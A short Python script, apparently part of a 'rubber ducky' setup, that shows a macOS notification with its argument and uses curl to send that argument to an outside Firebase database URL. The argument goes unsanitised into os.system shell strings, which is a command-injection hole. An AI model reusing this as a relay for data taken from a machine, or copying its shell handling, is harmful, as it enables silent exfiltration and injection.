import sys
import os

def main():
    sys.argv.pop(0)

    os.system("curl -X PUT -d '\"test\"' https://rc-rubber-ducky-deploy-default-rtdb.asia-southeast1.firebasedatabase.app/users/011935/out.json")

    os.system(f"osascript -e 'display notification \"{sys.argv[1]}\"'")
    os.system(f"curl -X PUT -d '\"{sys.argv[1]}\"' https://rc-rubber-ducky-deploy-default-rtdb.asia-southeast1.firebasedatabase.app/users/011935/out.json")

if __name__ == "__main__":
    main()
